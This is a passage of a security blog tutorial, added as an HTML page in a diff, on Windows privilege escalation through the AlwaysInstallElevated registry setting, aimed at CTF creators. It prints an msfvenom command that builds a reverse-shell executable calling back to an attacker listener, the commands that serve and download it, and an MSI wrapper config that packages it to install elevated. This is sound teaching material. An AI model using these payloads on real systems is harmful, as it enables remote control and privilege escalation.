@@ -1,0 +1,1301 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Windows Local Privilege Escalation - Registry Hives for CTF Creators - pwnlog</title><meta name="Description" content="Windows Local Privilege Escalation - Registry Hives"><meta property="og:url" content="//localhost:1313/windows-privesc-registry/">
+  <meta property="og:site_name" content="pwnlog">
+  <meta property="og:title" content="Windows Local Privilege Escalation - Registry Hives for CTF Creators">
+  <meta property="og:description" content="Windows Local Privilege Escalation - Registry Hives">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-03-20T11:33:00+08:00">
+    <meta property="article:modified_time" content="2022-03-20T11:33:00+08:00">
+    <meta property="article:tag" content="Registry Hives">
+    <meta property="article:tag" content="Alwaysinstallelevated">
+    <meta property="article:tag" content="Autorun">
+    <meta property="article:tag" content="Local Privilege Escalation">
+    <meta property="article:tag" content="Windows">
+    <meta property="og:image" content="//localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="//localhost:1313/logo.png">
+  <meta name="twitter:title" content="Windows Local Privilege Escalation - Registry Hives for CTF Creators">
+  <meta name="twitter:description" content="Windows Local Privilege Escalation - Registry Hives">
+<meta name="application-name" content="pwnlog">
+<meta name="apple-mobile-web-app-title" content="pwnlog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="//localhost:1313/windows-privesc-registry/" /><link rel="prev" href="//localhost:1313/windows-privesc-scheduled-tasks/" /><link rel="next" href="//localhost:1313/windows-privesc-port-forwarding/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Windows Local Privilege Escalation - Registry Hives for CTF Creators",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/\/localhost:1313\/windows-privesc-registry\/"
+        },"image": ["\/\/localhost:1313\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "registry hives, alwaysinstallelevated, autorun, local privilege escalation, windows","wordcount":  2667 ,
+        "url": "\/\/localhost:1313\/windows-privesc-registry\/","datePublished": "2022-03-20T11:33:00+08:00","dateModified": "2022-03-20T11:33:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "\/\/localhost:1313\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "pwnlog"
+            },"description": "Windows Local Privilege Escalation - Registry Hives"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> ~/ </a><a class="menu-item" href="/posts/"> ~/posts </a><a class="menu-item" href="/tags/"> ~/tags </a><a class="menu-item" href="/categories/"> ~/categories </a><a class="menu-item" href="/about/"> ~/about </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/" title="">~/</a><a class="menu-item" href="/posts/" title="">~/posts</a><a class="menu-item" href="/tags/" title="">~/tags</a><a class="menu-item" href="/categories/" title="">~/categories</a><a class="menu-item" href="/about/" title="">~/about</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Windows Local Privilege Escalation - Registry Hives for CTF Creators</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>pwnlog</a></span>&nbsp;<span class="post-category">included in <a href="/categories/windows-local-privilege-escalation/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Windows Local Privilege Escalation</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-03-20">2022-03-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2667 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;13 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#registry-hives">Registry Hives</a></li>
+    <li><a href="#privilege-escalation-via-alwaysinstallelevated">Privilege Escalation via AlwaysInstallElevated</a></li>
+    <li><a href="#privilege-escalation-via-autorun-registry">Privilege Escalation via Autorun Registry</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="registry-hives">Registry Hives</h1>
+<p>Registry hives are essential components of the Windows operating system&rsquo;s registry. They are logical groups of keys, subkeys, and values that store configuration settings and options for the operating system and installed applications. Each hive is associated with a set of supporting files that are loaded into memory when the system starts or a user logs in.</p>
+<p>Here are the main registry hives:</p>
+<ol>
+<li><strong>HKEY_CLASSES_ROOT (HKCR)</strong>: Contains information about registered applications, including file associations and OLE object class IDs.</li>
+<li><strong>HKEY_CURRENT_USER (HKCU)</strong>: Stores settings and preferences for the currently logged-in user.</li>
+<li><strong>HKEY_LOCAL_MACHINE (HKLM)</strong>: Contains configuration settings for the local computer, including hardware and software settings.</li>
+<li><strong>HKEY_USERS (HKU)</strong>: Holds user-specific settings for all users on the system.</li>
+<li><strong>HKEY_CURRENT_CONFIG (HKCC)</strong>: Contains information about the current hardware profile used by the system.</li>
+</ol>
+<p>Each hive has its own set of supporting files, typically located in the <code>%SystemRoot%\System32\Config</code> directory. These files are updated whenever changes are made to the registry.</p>
+<h1 id="privilege-escalation-via-alwaysinstallelevated">Privilege Escalation via AlwaysInstallElevated</h1>
+<p>The <a href="https://www.exemsi.com/" target="_blank" rel="noopener noreffer ">MSI Wrapper</a> is for software developers who have a setup executable file and want to offer an MSI that wraps their original setup executable file. It is also useful for system administrators with a <code>setup.exe</code> they want to distribute as an MSI to client computers in their organization.</p>
+<p>Once you have downloaded the MSI Wrapper:</p>
+<figure><a class="lightgallery" href="/images/posts/msi-wrapper-downloaded.png" title="/images/posts/msi-wrapper-downloaded.png" data-thumbnail="/images/posts/msi-wrapper-downloaded.png" data-sub-html="<h2>MSI Wrapper</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/msi-wrapper-downloaded.png"
+            data-srcset="/images/posts/msi-wrapper-downloaded.png, /images/posts/msi-wrapper-downloaded.png 1.5x, /images/posts/msi-wrapper-downloaded.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/msi-wrapper-downloaded.png" />
+    </a><figcaption class="image-caption">MSI Wrapper</figcaption>
+    </figure>
+<p>Execute the setup wizard and click <code>Next</code>:</p>
+<figure><a class="lightgallery" href="/images/posts/msi-wrapper-1.png" title="/images/posts/msi-wrapper-1.png" data-thumbnail="/images/posts/msi-wrapper-1.png" data-sub-html="<h2>MSI Wrapper</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/msi-wrapper-1.png"
+            data-srcset="/images/posts/msi-wrapper-1.png, /images/posts/msi-wrapper-1.png 1.5x, /images/posts/msi-wrapper-1.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/msi-wrapper-1.png" />
+    </a><figcaption class="image-caption">MSI Wrapper</figcaption>
+    </figure>
+<p>Accept the License Agreement and click <code>Next</code>:</p>
+<figure><a class="lightgallery" href="/images/posts/msi-wrapper-2.png" title="/images/posts/msi-wrapper-2.png" data-thumbnail="/images/posts/msi-wrapper-2.png" data-sub-html="<h2>MSI Wrapper</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/msi-wrapper-2.png"
+            data-srcset="/images/posts/msi-wrapper-2.png, /images/posts/msi-wrapper-2.png 1.5x, /images/posts/msi-wrapper-2.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/msi-wrapper-2.png" />
+    </a><figcaption class="image-caption">MSI Wrapper</figcaption>
+    </figure>
+<p>We can change the destination folder if we want, I will leave it as it is:</p>
+<figure><a class="lightgallery" href="/images/posts/msi-wrapper-3.png" title="/images/posts/msi-wrapper-3.png" data-thumbnail="/images/posts/msi-wrapper-3.png" data-sub-html="<h2>MSI Wrapper</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/msi-wrapper-3.png"
+            data-srcset="/images/posts/msi-wrapper-3.png, /images/posts/msi-wrapper-3.png 1.5x, /images/posts/msi-wrapper-3.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/msi-wrapper-3.png" />
+    </a><figcaption class="image-caption">MSI Wrapper</figcaption>
+    </figure>
+<p>Then click <code>Install</code>:</p>
+<figure><a class="lightgallery" href="/images/posts/msi-wrapper-4.png" title="/images/posts/msi-wrapper-4.png" data-thumbnail="/images/posts/msi-wrapper-4.png" data-sub-html="<h2>MSI Wrapper</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/msi-wrapper-4.png"
+            data-srcset="/images/posts/msi-wrapper-4.png, /images/posts/msi-wrapper-4.png 1.5x, /images/posts/msi-wrapper-4.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/msi-wrapper-4.png" />
+    </a><figcaption class="image-caption">MSI Wrapper</figcaption>
+    </figure>
+<p>Once it is completed, click on <code>Finish</code>:</p>
+<figure><a class="lightgallery" href="/images/posts/msi-wrapper-5.png" title="/images/posts/msi-wrapper-5.png" data-thumbnail="/images/posts/msi-wrapper-5.png" data-sub-html="<h2>MSI Wrapper</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/msi-wrapper-5.png"
+            data-srcset="/images/posts/msi-wrapper-5.png, /images/posts/msi-wrapper-5.png 1.5x, /images/posts/msi-wrapper-5.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/msi-wrapper-5.png" />
+    </a><figcaption class="image-caption">MSI Wrapper</figcaption>
+    </figure>
+<p>Optionally, we could create a desktop shortcut or pin to the taskbar:</p>
+<figure><a class="lightgallery" href="/images/posts/msi-wrapper-6.png" title="/images/posts/msi-wrapper-6.png" data-thumbnail="/images/posts/msi-wrapper-6.png" data-sub-html="<h2>MSI Wrapper</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/msi-wrapper-6.png"
+            data-srcset="/images/posts/msi-wrapper-6.png, /images/posts/msi-wrapper-6.png 1.5x, /images/posts/msi-wrapper-6.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/msi-wrapper-6.png" />
+    </a><figcaption class="image-caption">MSI Wrapper</figcaption>
+    </figure>
+<p>Generate an executable reverse shell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.119.130 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -f exe -o implant.exe
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
+</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
+</span></span><span class="line"><span class="cl">Payload size: <span class="m">460</span> bytes
+</span></span><span class="line"><span class="cl">Final size of exe file: <span class="m">7168</span> bytes
+</span></span><span class="line"><span class="cl">Saved as: implant.exe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Setup an HTTP listener:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo python3 -m http.server <span class="m">80</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> kali:
+</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</span></span><span class="line"><span class="cl">192.168.119.129 - - <span class="o">[</span>06/Mar/2022 17:54:06<span class="o">]</span> <span class="s2">&#34;GET /implant.exe HTTP/1.1&#34;</span> <span class="m">200</span> -
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Download the file with powershell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="nb">wget </span><span class="mf">192.168</span><span class="p">.</span><span class="py">119</span><span class="p">.</span><span class="mf">130</span><span class="p">/</span><span class="n">implant</span><span class="p">.</span><span class="py">exe</span> <span class="n">-O</span> <span class="n">implant</span><span class="p">.</span><span class="py">exe</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This will be the MSI wrapper configuration file <code>msi_template.xml</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;MsiWrapper&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;Installer&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;IconFile</span> <span class="na">Detect=</span><span class="s">&#34;executable&#34;</span> <span class="na">Value=</span><span class="s">&#34;&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Output</span> <span class="na">FileName=</span><span class="s">&#34;C:\Tools\implant.msi&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;InstallPrivileges</span> <span class="na">Value=</span><span class="s">&#34;Elevated&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;PerUser</span> <span class="na">Value=</span><span class="s">&#34;yes&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;ElevateExecutable</span> <span class="na">Value=</span><span class="s">&#34;always&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;UpgradeCode</span> <span class="na">Value=</span><span class="s">&#34;{55F46570-1C98-4098-9191-18B383E567D3}&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;ProductId</span> <span class="na">Value=</span><span class="s">&#34;&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Registration</span> <span class="na">Value=</span><span class="s">&#34;None&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Manufacturer</span> <span class="na">Detect=</span><span class="s">&#34;&#34;</span> <span class="na">Value=</span><span class="s">&#34;Holo Industries&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;ProductVersion</span> <span class="na">Detect=</span><span class="s">&#34;executable&#34;</span> <span class="na">Value=</span><span class="s">&#34;0.0.0.0&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;ProductName</span> <span class="na">Detect=</span><span class="s">&#34;&#34;</span> <span class="na">Value=</span><span class="s">&#34;Holo&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Comments</span> <span class="na">Detect=</span><span class="s">&#34;executable&#34;</span> <span class="na">Value=</span><span class="s">&#34;&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Contact</span> <span class="na">Detect=</span><span class="s">&#34;&#34;</span> <span class="na">Value=</span><span class="s">&#34;&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;HelpLink</span> <span class="na">Detect=</span><span class="s">&#34;&#34;</span> <span class="na">Value=</span><span class="s">&#34;&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;UpdateLink</span> <span class="na">Detect=</span><span class="s">&#34;&#34;</span> <span class="na">Value=</span><span class="s">&#34;&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;AboutLink</span> <span class="na">Detect=</span><span class="s">&#34;&#34;</span> <span class="na">Value=</span><span class="s">&#34;&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/Installer&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;WrappedInstaller&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Executable</span> <span class="na">FileName=</span><span class="s">&#34;C:\Tools\implant.exe&#34;</span> <span class="na">SuccessCodes=</span><span class="s">&#34;&#34;</span> <span class="na">Impersonate=</span><span class="s">&#34;no&#34;</span> <span class="na">IncludeFiles=</span><span class="s">&#34;no&#34;</span> <span class="na">CompressionLevel=</span><span class="s">&#34;Max&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;ApplicationId</span> <span class="na">Value=</span><span class="s">&#34;&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Install&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;Arguments</span> <span class="na">Value=</span><span class="s">&#34;&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;UILevelNone</span> <span class="na">Value=</span><span class="s">&#34;&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;UILevelBasic</span> <span class="na">Value=</span><span class="s">&#34;&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;UILevelReduced</span> <span class="na">Value=</span><span class="s">&#34;&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;UILevelFull</span> <span class="na">Value=</span><span class="s">&#34;&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/Arguments&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;RunBeforeInstall</span> <span class="na">Value=</span><span class="s">&#34;&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;RunAfterInstall</span> <span class="na">Value=</span><span class="s">&#34;&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/Install&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Uninstall&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;Arguments</span> <span class="na">Value=</span><span class="s">&#34;&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;UILevelNone</span> <span class="na">Value=</span><span class="s">&#34;&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;UILevelBasic</span> <span class="na">Value=</span><span class="s">&#34;&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;UILevelReduced</span> <span class="na">Value=</span><span class="s">&#34;&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;UILevelFull</span> <span class="na">Value=</span><span class="s">&#34;&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/Arguments&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/Uninstall&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/WrappedInstaller&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/MsiWrapper&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then we&rsquo;re gonna execute MSI Wrapper and click on <code>Load Settings</code>:</p>
+<figure><a class="lightgallery" href="/images/posts/msi-wrapper-7.png" title="/images/posts/msi-wrapper-7.png" data-thumbnail="/images/posts/msi-wrapper-7.png" data-sub-html="<h2>MSI Wrapper</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/msi-wrapper-7.png"
+            data-srcset="/images/posts/msi-wrapper-7.png, /images/posts/msi-wrapper-7.png 1.5x, /images/posts/msi-wrapper-7.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/msi-wrapper-7.png" />
+    </a><figcaption class="image-caption">MSI Wrapper</figcaption>
+    </figure>
+<p>Open the configuration file:</p>
+<figure><a class="lightgallery" href="/images/posts/msi-wrapper-8.png" title="/images/posts/msi-wrapper-8.png" data-thumbnail="/images/posts/msi-wrapper-8.png" data-sub-html="<h2>MSI Wrapper</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/msi-wrapper-8.png"
+            data-srcset="/images/posts/msi-wrapper-8.png, /images/posts/msi-wrapper-8.png 1.5x, /images/posts/msi-wrapper-8.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/msi-wrapper-8.png" />
+    </a><figcaption class="image-caption">MSI Wrapper</figcaption>
+    </figure>
+<p>Once the configuration is loaded, click <code>Ok</code> and then click on <code>Next &gt;</code>:</p>
+<figure><a class="lightgallery" href="/images/posts/msi-wrapper-9.png" title="/images/posts/msi-wrapper-9.png" data-thumbnail="/images/posts/msi-wrapper-9.png" data-sub-html="<h2>MSI Wrapper</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/msi-wrapper-9.png"
+            data-srcset="/images/posts/msi-wrapper-9.png, /images/posts/msi-wrapper-9.png 1.5x, /images/posts/msi-wrapper-9.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/msi-wrapper-9.png" />
+    </a><figcaption class="image-caption">MSI Wrapper</figcaption>
+    </figure>
+<p>Verify the executable and the implant MSI package:</p>
+<figure><a class="lightgallery" href="/images/posts/msi-wrapper-10.png" title="/images/posts/msi-wrapper-10.png" data-thumbnail="/images/posts/msi-wrapper-10.png" data-sub-html="<h2>MSI Wrapper</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/msi-wrapper-10.png"
+            data-srcset="/images/posts/msi-wrapper-10.png, /images/posts/msi-wrapper-10.png 1.5x, /images/posts/msi-wrapper-10.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/msi-wrapper-10.png" />
+    </a><figcaption class="image-caption">MSI Wrapper</figcaption>
+    </figure>
+<p>This setting is up to you:</p>
+<figure><a class="lightgallery" href="/images/posts/msi-wrapper-11.png" title="/images/posts/msi-wrapper-11.png" data-thumbnail="/images/posts/msi-wrapper-11.png" data-sub-html="<h2>MSI Wrapper</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/msi-wrapper-11.png"
+            data-srcset="/images/posts/msi-wrapper-11.png, /images/posts/msi-wrapper-11.png 1.5x, /images/posts/msi-wrapper-11.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/msi-wrapper-11.png" />
+    </a><figcaption class="image-caption">MSI Wrapper</figcaption>
+    </figure>
+<p>Make sure the Security and User Context are correct:</p>
+<figure><a class="lightgallery" href="/images/posts/msi-wrapper-12.png" title="/images/posts/msi-wrapper-12.png" data-thumbnail="/images/posts/msi-wrapper-12.png" data-sub-html="<h2>MSI Wrapper</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/msi-wrapper-12.png"
+            data-srcset="/images/posts/msi-wrapper-12.png, /images/posts/msi-wrapper-12.png 1.5x, /images/posts/msi-wrapper-12.png 2x"
